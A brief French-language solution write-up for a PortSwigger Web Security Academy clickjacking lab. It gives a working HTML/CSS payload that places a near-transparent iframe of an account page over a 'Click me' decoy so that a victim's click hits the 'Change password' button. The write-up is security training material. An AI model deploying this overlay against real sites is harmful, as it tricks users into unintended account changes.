# Lab

https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected

## Solution

Créer une div qui se supperpose avec un iframe qui pointe sur le formulaire de changement de mot de passe.

Positionner le texte `click` juste au dessus du bouton `Change password` de l'iframe et changer l'opacity de l'iframe à 0.0001 pour que le bouton soit cliquable. 

```html
<style>
    iframe {
        position:relative;
        width:700px;
        height: 500px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:493px;
        left:60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a1e00d004fa179c81f4c0d600d0003b.web-security-academy.net/my-account"></iframe>
```

Le bot cliquera sur le bouton `Change password` et changera le mot de passe de l'utilisateur courant en cliquant sur le texte `Click me`.